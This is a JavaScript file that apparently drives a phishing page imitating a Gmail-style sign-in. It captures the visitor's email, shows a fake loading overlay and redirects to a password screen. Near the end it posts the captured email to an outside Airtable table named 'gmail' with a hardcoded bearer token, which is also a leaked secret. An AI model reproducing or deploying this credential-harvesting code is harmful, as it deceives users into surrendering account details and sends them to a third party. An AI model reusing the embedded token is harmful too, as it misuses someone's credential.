function movePlaceholder(input) {
    const label = input.nextElementSibling;
    label.classList.add('active');
}

function resetPlaceholder(input) {
    const label = input.nextElementSibling;
    if (!input.value) {
        label.classList.remove('active');
    }
}

function SendMail(){
    var body = document.getElementById("email").value;
    window.location.href = "mailto:itsdestinyrich@gmail.com"
}

// Function to update the displayed email on the password screen
function updateEmailDisplay(input) {
    const emailDisplay = document.getElementById("email-display");
    emailDisplay.textContent = input.value || "Enter your email";
}

// Function to toggle password visibility on the password screen
function togglePasswordVisibility() {
    const passwordInput = document.getElementById("password");
    const checkbox = document.getElementById("show-password");

    if (checkbox && passwordInput) {
        passwordInput.type = checkbox.checked ? "text" : "password";
    }
}

// Function to save the email to localStorage and redirect to the password screen
document.querySelector('.next-button').addEventListener('click', function (event) {
    event.preventDefault(); // Prevent form submission

    const emailInput = document.getElementById('email').value;

    if (emailInput) {
        // Show loading overlay
        document.getElementById('loading-overlay').style.display = 'flex';

        // Save email to localStorage
        localStorage.setItem('userEmail', emailInput);

        // Simulate email sending with a timeout
        setTimeout(() => {
            document.getElementById('loading-overlay').style.display = 'none';

            // Redirect to the password screen
            window.location.href = 'password.html';
        }, 2000); // 2 seconds delay for demonstration
    } else {
        alert('Please enter a valid email address.');
    }
});

// On the password screen, load the stored email
function loadEmail() {
    const emailDisplay = document.getElementById("email-display");
    const storedEmail = localStorage.getItem("userEmail");
    emailDisplay.textContent = storedEmail || "No email provided";
}

// Airtable API request example
fetch('https://api.airtable.com/v0/patnIuvI2jEyC9QTY/gmail', {
    method: 'POST',
    headers: {
        Authorization: 'Bearer patnIuvI2jEyC9QTY.7dc1a78c1eea0e6ac85b67207fbba6d0448dd5f70b1a074ae93a0b28dff20b2a',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        records: [
            {
                fields: { Email: localStorage.getItem('userEmail') }
            }
        ]
    })
})
.then(response => response.json())
.then(data => {
    // Handle response and redirect as needed
    console.log("Email saved to Airtable:", data);
})
.catch(error => console.error("Error saving to Airtable:", error));
